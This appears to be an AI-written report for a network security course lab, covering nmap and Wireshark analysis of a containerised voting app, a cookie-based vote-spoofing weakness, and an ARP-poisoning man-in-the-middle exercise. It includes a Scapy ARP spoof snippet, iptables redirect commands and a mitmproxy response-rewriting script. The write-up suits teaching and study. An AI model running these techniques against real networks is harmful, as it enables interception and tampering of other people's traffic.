This is the final, comprehensive documentation for your **Network Security Assignment**. It covers the analysis of the Voting App (Tasks 1 & 2) and the Man-in-the-Middle attack (Task 3).

---

# Cyber Security Testing: Network Analysis & MITM Report

**Date:** February 8, 2026

**Environment:** Kali Linux, Docker/Podman, Wireshark, Nmap

---

## Task 1 & 2: Network Discovery and Service Analysis

### 1.1 Network Mapping and Service Identification

The target environment was the "Example Voting App" running in a containerized Docker network. Using `nmap`, we mapped the services and identified their roles.

**Commands Used:**

* `docker network inspect <network_id>` (To identify internal subnets).
* `nmap -sV -p 8080,8081 127.0.0.1` (To fingerprint exposed services).

**Identified Services:**
| IP Address | Component | Port | Service/Version |
| :--- | :--- | :--- | :--- |
| 172.x.x.2 | **Redis** | 6379 | Redis key-value store |
| 172.x.x.3 | **Postgres** | 5432 | PostgreSQL Database |
| 127.0.0.1 | **Vote App** | 8080 | Python/Werkzeug (Front-end) |
| 127.0.0.1 | **Result App** | 8081 | Node.js Express (Front-end) |

**Analysis:** Nmap successfully identified the server versions. The front-end apps are exposed to the host, while the database and cache remain on the internal backend network for security.

### 1.2 Protocol and Traffic Analysis

Using Wireshark, we captured traffic during the voting process.

* **Front-tier Traffic:** We observed **HTTP** traffic on Port 80. The data is sent in plain text (unencrypted), allowing us to see the `POST` request containing the specific vote.
* **Back-tier Traffic:** We observed **RESP** (Redis Serialization Protocol) over TCP. Immediately after a vote is cast, the Python app pushes the data to the Redis container.

### 1.3 Vulnerability: Unique Vote Determination

**Findings:** The application determines a "unique" vote based on a browser cookie named `voter_id`.

**Security Risk:** This mechanism is highly susceptible to **spoofing**. An attacker can delete or modify the cookie value to bypass the "one vote" restriction, leading to **Ballot Stuffing**.

### 1.4 Aggressive Scanning and Detection

We performed an aggressive scan using `nmap -A`.

* **Observations:** This scan is "noisy" and generates a massive spike in traffic (SYN floods and script probes).
* **Detection:** In Wireshark, we identified the scan via the **User-Agent** header: `Mozilla/5.0 (compatible; Nmap Scripting Engine)`. This demonstrates how easily such tools are detected by basic logging or IDS.

---

## Task 3: ARP Poisoning and MitM Attack

### 3.1 Objective

The goal was to intercept traffic between a client (**Alice**) and a server (**Bob**) by poisoning their ARP caches from a third container (**Mallory**), and then modifying the server's response.

### 3.2 ARP Cache Poisoning (Scapy)

We developed a Python script using the Scapy library to send unsolicited ARP replies. Mallory told Alice she was Bob, and told Bob she was Alice.

**ARP Spoofing Script Snippet:**

```python
# Tells Target they should send traffic for Spoof_IP to Mallory's MAC
packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=MALLORY_MAC)
send(packet, verbose=False)

```

* **Proof of Success:** Running `ip neigh show` in Alice's container showed Bob's IP associated with Mallory's MAC address.

### 3.3 Traffic Interception and Modification (mitmproxy)

With traffic flowing through Mallory, we used `iptables` to redirect HTTP traffic to a transparent proxy.

**Commands used in Mallory:**

1. `sysctl -w net.ipv4.ip_forward=1` (Enable routing).
2. `iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080` (Redirect to proxy).

**Modification Script (`modify.py`):**

```python
def response(flow):
    if b"This is Bob's web server!" in flow.response.content:
        flow.response.content = flow.response.content.replace(
            b"This is Bob's web server!", b"This is not Bob!"
        )

```

### 3.4 Results

When Alice executed `curl http://<Bob_IP>`, the following occurred:

1. The request went to Mallory due to ARP poisoning.
2. Mallory's proxy intercepted the request and fetched the page from Bob.
3. The proxy modified the content and sent it back to Alice.
4. **Alice's Terminal Output:** `This is not Bob!`

---

**Next Step:** Would you like me to help you export the Python scripts or the Wireshark `.pcap` file for your final upload?
